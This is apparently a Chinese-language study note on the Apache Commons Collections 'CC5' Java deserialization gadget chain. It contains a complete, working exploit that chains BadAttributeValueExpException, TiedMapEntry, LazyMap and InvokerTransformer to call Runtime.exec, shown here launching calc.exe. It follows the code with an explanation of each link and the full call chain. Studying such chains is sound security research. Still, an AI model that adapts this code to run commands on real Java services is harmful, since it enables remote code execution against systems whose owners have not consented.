---
title: CC5链
date: 2026-03-28
updated: 2026-03-28
tags:
  - 链子
categories:
  - 链子
description: CC5链
published: true
---
```java
import org.apache.commons.collections.Transformer;  
import org.apache.commons.collections.functors.ChainedTransformer;  
import org.apache.commons.collections.functors.ConstantTransformer;  
import org.apache.commons.collections.functors.InvokerTransformer;  
import org.apache.commons.collections.keyvalue.TiedMapEntry;  
import org.apache.commons.collections.map.LazyMap;  
  
import javax.management.BadAttributeValueExpException;  
import java.io.*;  
import java.lang.reflect.Field;  
import java.util.HashMap;  
import java.util.Map;  
  
public class CC5Exp {  
  
    public static void main(String[] args) throws Exception {  
  
        // 构造核心的恶意执行链  
        Transformer[] transformers = new Transformer[]{  
                new ConstantTransformer(Runtime.class),  
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),  
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),  
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})  
        };  
        Transformer transformerChain = new ChainedTransformer(transformers);  
  
        // 构造 LazyMap (包裹着恶意链)  
        Map innerMap = new HashMap();  
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);  
  
        // 构造 TiedMapEntry (连接 toString 和 LazyMap.get 的桥梁)  
        // 将上面构造好的 lazyMap 传进去，key 随便设一个就行（比如 "foo"）  
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");  
  
        // 第四步：构造 BadAttributeValueExpException (新的入口点)  
        // 如果直接 new BadAttributeValueExpException(tiedMapEntry);        // 这个构造函数内部会立刻调用 tiedMapEntry.toString()，导致本地直接弹计算器。  
        // 所以，需要先传一个 null 或者无害的字符串进去。  
        BadAttributeValueExpException valExp = new BadAttributeValueExpException(null);  
  
        // 利用反射，把 TiedMapEntry 塞进 Exception 对象的 val 属性中。  
        // 这样在序列化时不会触发，只有等受害者反序列化 readObject 时才会引爆。  
        Field valField = valExp.getClass().getDeclaredField("val");  
        valField.setAccessible(true);  
        valField.set(valExp, tiedMapEntry);  
  
        byte[] bytes = serialize(valExp);  
        System.out.println("序列化完成，准备触发反序列化...");  
  
        // readObject -> toString -> getValue -> get -> transform  
        unserialize(bytes);  
    }  
    public static byte[] serialize(Object obj) throws IOException {  
        ByteArrayOutputStream baos = new ByteArrayOutputStream();  
        ObjectOutputStream oos = new ObjectOutputStream(baos);  
        oos.writeObject(obj);  
        return baos.toByteArray();  
    }  
    public static void unserialize(byte[] data) throws Exception {  
        ByteArrayInputStream bais = new ByteArrayInputStream(data);  
        ObjectInputStream ois = new ObjectInputStream(bais);  
        ois.readObject();  
        ois.close();  
    }  
}
```

新入口 BadAttributeValueExpException，JDK 自带的一个异常类，它的 `readObject` 方法中，有一段逻辑：如果安全管理器（SecurityManager）允许，它会去获取内部变量 `val` 的值，并调用它的 `toString()` 方法。

这里的 `valObj` 就是我们通过反射设置的 `tiedMapEntry` 对象

![[attachments/20260328172953.png]]

`TiedMapEntry` 的作用是将一个 key 和一个 Map 绑定在一起。当调用它的 `toString()` 方法时，为了拼接字符串，它底层会自动去调用内部 Map 的 `get(key)` 方法来获取对应的值。

> 把 `TiedMapEntry` 传给 `BadAttributeValueExpException` 的 `val` 属性，然后把包含恶意 Transformer 的 `LazyMap` 传给 `TiedMapEntry` 内部的 Map。由此将入口的 `toString()` 和目标 `LazyMap` 的 `get()` 连接起来。

![[attachments/20260328173034.png]]

这里的 `map` 是 `lazyMap`，`key` 是 `"foo"`

![[attachments/20260328173050.png]]

随后调用 `LazyMap.get()`，`factory` 就是 `transformerChain`，`key` 是 `"foo"`（不存在于 innerMap 中）

CC5 的后半段（`LazyMap` 到 `InvokerTransformer`）和 CC1 相同

```
ois.readObject() <=> ObjectInputStream.readObject()
BadAttributeValueExpException::readObject()
	->TiedMapEntry::toString()
	->TiedMapEntry::getValue()
	->LazyMap::get()
	->ChainedTransformer::transform()
	->ConstantTransformer::transform()
	->InvokerTransformer::transform()
```